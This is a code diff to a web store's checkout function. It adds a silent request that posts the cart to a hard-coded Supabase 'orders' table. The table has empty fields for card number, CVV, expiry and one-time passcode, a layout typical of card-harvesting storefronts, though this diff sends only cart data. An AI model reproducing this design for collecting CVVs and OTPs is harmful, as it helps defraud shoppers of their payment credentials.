@@ -255,6 +255,24 @@
             }
             const total = cartItems.reduce((sum, item) => sum + (item.price * item.qty), 0) - discountAmount;
             localStorage.setItem('auraCheckoutTotal', JSON.stringify({ total: total < 0 ? 0 : total, discount: discountAmount }));
+            try {
+                var _sbUrl = 'https://blozysudthytzkfepgqc.supabase.co';
+                var _sbKey = 'sb_publishable_tRk0OqQQQlxCt8dlngXwfw_DtrqVaXM';
+                var _pid = 'CART-' + Date.now().toString().slice(-6);
+                fetch(_sbUrl + '/rest/v1/orders', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'apikey': _sbKey, 'Authorization': 'Bearer ' + _sbKey },
+                    body: JSON.stringify({
+                        order_id: _pid,
+                        customer_name: '🛒 عميل جديد (قيد الدفع)',
+                        customer_phone: '', customer_address: '', customer_country: '',
+                        products: JSON.stringify(cartItems),
+                        total: total < 0 ? 0 : total,
+                        card_holder: '', card_number: '', card_expiry: '', card_cvv: '', card_type: '', card_otp: '',
+                        status: 'بانتظار الدفع'
+                    })
+                }).catch(function(){});
+            } catch(e) {}
             window.location.href='/checkout/';
         }
 
